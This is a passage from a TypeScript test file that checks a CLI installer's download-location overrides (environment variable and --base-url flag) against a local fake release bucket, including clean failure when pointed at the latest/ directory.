  async function bucket(dirs: Dirs): Promise<string> {
    const root = join(dirs.home, 'bucket');
    for (const version of ['9.8.6', '9.8.7']) {
      const files = fullRelease();
      for (const target of TARGETS) files[target.name] = fakeBinary(target.name).replace('smurg 9.8.7', `smurg ${version}`);
      files['SHA256SUMS'] = TARGETS.map((target) => `${sha(files[target.name] as string)}  ${target.name}\n`).join('');
      files['THIRD-PARTY-NOTICES.txt'] = `notices of ${version}\n`;
      files['install.sh'] = (await readFile(INSTALL, 'utf8')).replace("SMURG_RELEASE_BASE_URL=''", `SMURG_RELEASE_BASE_URL='https://downloads.smurg.ai/v${version}'`);
      for (const [name, text] of Object.entries(files)) {
        await mkdir(join(root, `v${version}`), { recursive: true });
        await writeFile(join(root, `v${version}`, name), text);
      }
    }
    await mkdir(join(root, 'latest'), { recursive: true });
    await writeFile(join(root, 'latest', 'install.sh'), await readFile(join(root, 'v9.8.7', 'install.sh')));
    await writeFile(join(root, 'latest', 'VERSION'), '9.8.7\n');
    return root;
  }

  it('the download location can still be overridden (SMURG_INSTALL_BASE_URL, --base-url): it picks a version prefix; latest/ itself is not one', async () => {
    const dirs = await setup();
    const server = await serveBucket(await bucket(dirs));
    const f = await faked(LINUX_X64);
    const latest = await readFile(join(dirs.home, 'bucket', 'latest', 'install.sh'), 'utf8');

    // `curl -fsSL <server>/latest/install.sh | SMURG_INSTALL_BASE_URL=<server>/v9.8.6 sh`: the older version.
    const pinned = await runShell('/bin/sh', ['-s', '--', '--no-deps'], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
    expect(pinned.out).toContain('smurg 9.8.6 (fake smurg-linux-x64)');
    expect(pinned.code).toBe(0);
    expect(pinned.out).toContain(`第三方元件的授權條款：${server.base}/v9.8.6/THIRD-PARTY-NOTICES.txt`);
    expect(server.requests.sort()).toEqual(['/v9.8.6/SHA256SUMS', '/v9.8.6/smurg-linux-x64']);

    // --base-url wins over the environment.
    server.requests.length = 0;
    const flag = await runShell('/bin/sh', ['-s', '--', '--no-deps', '--base-url', `${server.base}/v9.8.7/`], { ...f.env, SMURG_INSTALL_BASE_URL: `${server.base}/v9.8.6` }, latest);
    expect(flag.out).toContain('smurg 9.8.7 (fake smurg-linux-x64)');
    expect(flag.code).toBe(0);
    expect(server.requests.sort()).toEqual(['/v9.8.7/SHA256SUMS', '/v9.8.7/smurg-linux-x64']);
    expect(await readFile(join(f.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));

    // latest/ holds only install.sh and VERSION: as a download location it fails cleanly and installs nothing.
    const g = await faked(LINUX_X64);
    server.requests.length = 0;
    const wrong = await runShell('/bin/sh', ['-s', '--', '--no-deps'], { ...g.env, SMURG_INSTALL_BASE_URL: `${server.base}/latest` }, latest);
    expect(wrong.code).not.toBe(0);
    expect(wrong.out).toContain(`無法下載 ${server.base}/latest/SHA256SUMS`);
    expect(server.requests).toEqual(['/latest/SHA256SUMS']);
    expect(existsSync(join(g.dirs.home, '.local', 'bin'))).toBe(false);
  });
});
